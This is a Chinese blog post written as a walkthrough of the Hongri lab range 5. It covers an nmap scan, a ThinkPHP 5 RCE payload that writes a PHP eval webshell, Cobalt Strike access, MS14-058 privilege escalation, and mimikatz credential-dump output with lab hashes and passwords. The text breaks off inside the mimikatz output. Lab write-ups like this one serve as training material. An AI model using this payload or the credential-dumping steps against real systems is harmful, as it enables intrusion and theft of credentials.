@@ -1,0 +1,224 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="红日靶场五\r感觉这个比前面几个简单一点（bushi）\n解法一：\r全程用CS做，配合一些插件比较容易可以做\n首先扫一下开放了哪些端口\nnmap -sS 192.168.111.150 -T4 -Pn Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 14:00 +0800 Nmap scan report for 192.168.111.150 Host is up (0.070s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds 开放了80和3306，开放的端口不多，先看看80上跑的是什么服务\n"><title>红日靶场（五）渗透</title><link rel=canonical href=https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94%E6%B8%97%E9%80%8F/><link rel=stylesheet href=/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css><meta property='og:title' content="红日靶场（五）渗透"><meta property='og:description' content="红日靶场五\r感觉这个比前面几个简单一点（bushi）\n解法一：\r全程用CS做，配合一些插件比较容易可以做\n首先扫一下开放了哪些端口\nnmap -sS 192.168.111.150 -T4 -Pn Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 14:00 +0800 Nmap scan report for 192.168.111.150 Host is up (0.070s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds 开放了80和3306，开放的端口不多，先看看80上跑的是什么服务\n"><meta property='og:url' content='https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94%E6%B8%97%E9%80%8F/'><meta property='og:site_name' content='Oight'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2026-07-09T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-09T00:00:00+00:00'><meta name=twitter:title content="红日靶场（五）渗透"><meta name=twitter:description content="红日靶场五\r感觉这个比前面几个简单一点（bushi）\n解法一：\r全程用CS做，配合一些插件比较容易可以做\n首先扫一下开放了哪些端口\nnmap -sS 192.168.111.150 -T4 -Pn Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 14:00 +0800 Nmap scan report for 192.168.111.150 Host is up (0.070s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds 开放了80和3306，开放的端口不多，先看看80上跑的是什么服务\n"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_37edead8cd3c258e.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐧</span></figure><div class=site-meta><h1 class=site-name><a href=/>Oight</a></h1><h2 class=site-description>Talk is cheap. Show me the code.</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/696224138 target=_blank title=bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/Oight target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#解法一>解法一：</a></li><li><a href=#解法二未成功>解法二（未成功）</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%B8%97%E9%80%8F/>渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94%E6%B8%97%E9%80%8F/>红日靶场（五）渗透</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2026-07-09</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 6 分钟</time></div></footer></div></header><section class=article-content><h1 id=红日靶场五>红日靶场五</h1><p>感觉这个比前面几个简单一点（bushi）</p><h2 id=解法一>解法一：</h2><p>全程用CS做，配合一些插件比较容易可以做</p><p>首先扫一下开放了哪些端口</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sS 192.168.111.150 -T4 -Pn
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-09 14:00 +0800
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.111.150
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.070s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE
+</span></span><span class=line><span class=cl>80/tcp   open  http
+</span></span><span class=line><span class=cl>3306/tcp open  mysql
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.49 seconds
+</span></span></code></pre></div><p>开放了80和3306，开放的端口不多，先看看80上跑的是什么服务</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5n3om3j30t60dljte.jpg loading=lazy alt=image-20260709165944417></p><p>可以看到是ThinkPHP V5，知道版本后可以搜索一下有没有什么现成可以利用的CVE</p><p>找到了这个<a class=link href=https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/ target=_blank rel=noopener>ThinkPHP 5.x 远程代码执行漏洞</a></p><p>可以验证漏洞存在</p><p><img src=https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5mxe7uj31340wbdna.jpg loading=lazy alt=image-20260709170309247></p><p>但按照上面文章中的方法写webshell写不进去，所以参考了另外一篇： <a class=link href=https://www.freebuf.com/vuls/334236.html target=_blank rel=noopener>ThinkPHP5系列远程代码执行漏洞复现getshell</a></p><p>payload：<code>s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=1.php&amp;vars[1][]=&lt;?php @eval($_POST['1qaz']);?></code></p><p><img src=https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5mrt6cj30o10gwdib.jpg loading=lazy alt=image-20260709170613137></p><p>连接上webshell之后就可以上线CS了</p><p>上线后发现这是一台windows主机，权限是Administrator</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5mnwmgj30k905xdh4.jpg loading=lazy alt=image-20260709170901868></p><p>先看看主机信息</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl> beacon<span class=p>&gt;</span> shell systeminfo
+</span></span><span class=line><span class=cl> [*] Tasked beacon to run: systeminfo
+</span></span><span class=line><span class=cl> [+] host called home, sent: 41 bytes
+</span></span><span class=line><span class=cl> [+] received output:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>主机名:           WIN7
+</span></span><span class=line><span class=cl>OS 名称:          Microsoft Windows 7 专业版 
+</span></span><span class=line><span class=cl>OS 版本:          6.1.7601 Service Pack 1 Build 7601
+</span></span><span class=line><span class=cl>OS 制造商:        Microsoft Corporation
+</span></span><span class=line><span class=cl>OS 配置:          成员工作站
+</span></span><span class=line><span class=cl>OS 构件类型:      Multiprocessor Free
+</span></span><span class=line><span class=cl>注册的所有人:     Windows 用户
+</span></span><span class=line><span class=cl>注册的组织:       
+</span></span><span class=line><span class=cl>产品 ID:          00371-177-0000061-85581
+</span></span><span class=line><span class=cl>初始安装日期:     2020/3/5, 0:44:56
+</span></span><span class=line><span class=cl>系统启动时间:     2026/7/9, 5:53:33
+</span></span><span class=line><span class=cl>系统制造商:       VMware, Inc.
+</span></span><span class=line><span class=cl>系统型号:         VMware Virtual Platform
+</span></span><span class=line><span class=cl>系统类型:         x64-based PC
+</span></span><span class=line><span class=cl>处理器:           安装了 1 个处理器。
+</span></span><span class=line><span class=cl>                  [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2200 Mhz
+</span></span><span class=line><span class=cl>BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12
+</span></span><span class=line><span class=cl>Windows 目录:     C:\Windows
+</span></span><span class=line><span class=cl>系统目录:         C:\Windows\system32
+</span></span><span class=line><span class=cl>启动设备:         \Device\HarddiskVolume1
+</span></span><span class=line><span class=cl>系统区域设置:     zh-cn;中文(中国)
+</span></span><span class=line><span class=cl>输入法区域设置:   zh-cn;中文(中国)
+</span></span><span class=line><span class=cl>时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
+</span></span><span class=line><span class=cl>物理内存总量:     2,047 MB
+</span></span><span class=line><span class=cl>可用的物理内存:   1,477 MB
+</span></span><span class=line><span class=cl>虚拟内存: 最大值: 4,095 MB
+</span></span><span class=line><span class=cl>虚拟内存: 可用:   3,300 MB
+</span></span><span class=line><span class=cl>虚拟内存: 使用中: 795 MB
+</span></span><span class=line><span class=cl>页面文件位置:     C:\pagefile.sys
+</span></span><span class=line><span class=cl>域<span class=p>:</span>               <span class=nl>sun.com</span>
+</span></span><span class=line><span class=cl>登录服务器:       暂缺
+</span></span><span class=line><span class=cl>修补程序:         暂缺
+</span></span><span class=line><span class=cl>网卡:             安装了 2 个 NIC。
+</span></span><span class=line><span class=cl>                  [01]: Intel(R) PRO/1000 MT Network Connection
+</span></span><span class=line><span class=cl>                      连接名:      wk1 waiwang
+</span></span><span class=line><span class=cl>                      启用 DHCP:   否
+</span></span><span class=line><span class=cl>                      IP 地址
+</span></span><span class=line><span class=cl>                        [01]: 192.168.111.150
+</span></span><span class=line><span class=cl>                        [02]: fe80::74ff:9ed7:53ab:d404
+</span></span><span class=line><span class=cl>                  [02]: Intel(R) PRO/1000 MT Network Connection
+</span></span><span class=line><span class=cl>                      连接名:      本地连接
+</span></span><span class=line><span class=cl>                      启用 DHCP:   否
+</span></span><span class=line><span class=cl>                      IP 地址
+</span></span><span class=line><span class=cl>                        [01]: 192.168.138.136
+</span></span><span class=line><span class=cl>                        [02]: fe80::edf4:9135:b0e6:cfc4
+</span></span></code></pre></div><p><img src=https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5midz7j30wl0x3103.jpg loading=lazy alt=image-20260709171150311></p><p>可以使用MS14-058提权</p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5marcxj30pq12swkf.jpg loading=lazy alt=image-20260709171350956></p><p>shell回连</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5m52scj30kx05o75l.jpg loading=lazy alt=image-20260709171512757></p><p>现在已经提升至system权限，现在可以尝试探测内网了</p><p><img src=https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5lxu1kj30tz0djjtn.jpg loading=lazy alt=image-20260709171921420></p><p>域内只有一台主机（但我看其他WP里写是有两台，应该是我的问题）</p><p><img src=https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5m1pd1j30rv0d3q4w.jpg loading=lazy alt=image-20260709171712637></p><p>但有多个账户，我们需要横向到域控的system</p><p>查看一下域控IP</p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ltia9j31360ccgoo.jpg loading=lazy alt=image-20260709172316162></p><p>可以看到这是一台多网卡主机，域控IP <code>192.168.138.138</code></p><p>用fscan扫一下</p><p>先上传fscan</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5li4wyj30l70orn0o.jpg loading=lazy alt=image-20260709172538777></p><p>然后进行扫描</p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ln8d8j30ux0ncq74.jpg loading=lazy alt=image-20260709172443652></p><p>开放了445端口，似乎可以用永恒之蓝，但CS上不太好操作~~（也可能是因为我不会）~~</p><p>所以我们用mimikatz ： <code>mimikatz sekurlsa::logonpasswords</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>[07/09 15:53:56] beacon<span class=p>&gt;</span> mimikatz sekurlsa::logonpasswords
+</span></span><span class=line><span class=cl>[07/09 15:53:56] [*] Tasked beacon to run mimikatz&#39;s sekurlsa::logonpasswords command
+</span></span><span class=line><span class=cl>[07/09 15:53:56] [+] host called home, sent: 788090 bytes
+</span></span><span class=line><span class=cl>[07/09 15:53:58] [+] received output:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : 0 ; 131439 (00000000:0002016f)
+</span></span><span class=line><span class=cl>Session           : Batch from 0
+</span></span><span class=line><span class=cl>User Name         : Administrator
+</span></span><span class=line><span class=cl>Domain            : SUN
+</span></span><span class=line><span class=cl>Logon Server      : DC
+</span></span><span class=line><span class=cl>Logon Time        : 2026/7/9 5:54:08
+</span></span><span class=line><span class=cl>SID               : S-1-5-21-3388020223-1982701712-4030140183-500
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 [00000003] Primary
+</span></span><span class=line><span class=cl>	 * Username : Administrator
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * LM       : c8c42d085b5e3da2e9260223765451f1
+</span></span><span class=line><span class=cl>	 * NTLM     : e8bea972b3549868cecd667a64a6ac46
+</span></span><span class=line><span class=cl>	 * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	 * Username : Administrator
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * Password : dc123.com
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : Administrator
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * Password : dc123.com
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : Administrator
+</span></span><span class=line><span class=cl>	 * Domain   : SUN.COM
+</span></span><span class=line><span class=cl>	 * Password : dc123.com
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>	 [00000000]
+</span></span><span class=line><span class=cl>	 * Username : SUN\Administrator
+</span></span><span class=line><span class=cl>	 * Domain   : SUN\Administrator
+</span></span><span class=line><span class=cl>	 * Password : dc123.com
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : 0 ; 997 (00000000:000003e5)
+</span></span><span class=line><span class=cl>Session           : Service from 0
+</span></span><span class=line><span class=cl>User Name         : LOCAL SERVICE
+</span></span><span class=line><span class=cl>Domain            : NT AUTHORITY
+</span></span><span class=line><span class=cl>Logon Server      : (null)
+</span></span><span class=line><span class=cl>Logon Time        : 2026/7/9 5:53:50
+</span></span><span class=line><span class=cl>SID               : S-1-5-19
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : (null)
+</span></span><span class=line><span class=cl>	 * Domain   : (null)
+</span></span><span class=line><span class=cl>	 * Password : (null)
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : (null)
+</span></span><span class=line><span class=cl>	 * Domain   : (null)
+</span></span><span class=line><span class=cl>	 * Password : (null)
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : 0 ; 996 (00000000:000003e4)
+</span></span><span class=line><span class=cl>Session           : Service from 0
+</span></span><span class=line><span class=cl>User Name         : WIN7$
+</span></span><span class=line><span class=cl>Domain            : SUN
+</span></span><span class=line><span class=cl>Logon Server      : (null)
+</span></span><span class=line><span class=cl>Logon Time        : 2026/7/9 5:53:50
+</span></span><span class=line><span class=cl>SID               : S-1-5-20
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 [00000003] Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * NTLM     : 57a7c3c04367ee520cc20f7fcd52ca72
+</span></span><span class=line><span class=cl>	 * SHA1     : e78f8e8508562dafdb9ef67743f37cad7c7a8db1
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d 
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : win7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN.COM
+</span></span><span class=line><span class=cl>	 * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : 0 ; 46412 (00000000:0000b54c)
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from 0
+</span></span><span class=line><span class=cl>User Name         : (null)
+</span></span><span class=line><span class=cl>Domain            : (null)
+</span></span><span class=line><span class=cl>Logon Server      : (null)
+</span></span><span class=line><span class=cl>Logon Time        : 2026/7/9 5:53:45
+</span></span><span class=line><span class=cl>SID               : 
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 [00000003] Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * NTLM     : 57a7c3c04367ee520cc20f7fcd52ca72
+</span></span><span class=line><span class=cl>	 * SHA1     : e78f8e8508562dafdb9ef67743f37cad7c7a8db1
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : 0 ; 999 (00000000:000003e7)
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from 0
+</span></span><span class=line><span class=cl>User Name         : WIN7$
+</span></span><span class=line><span class=cl>Domain            : SUN
+</span></span><span class=line><span class=cl>Logon Server      : (null)
+</span></span><span class=line><span class=cl>Logon Time        : 2026/7/9 5:53:45
+</span></span><span class=line><span class=cl>SID               : S-1-5-18
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN
+</span></span><span class=line><span class=cl>	 * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d 
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : win7$
+</span></span><span class=line><span class=cl>	 * Domain   : SUN.COM
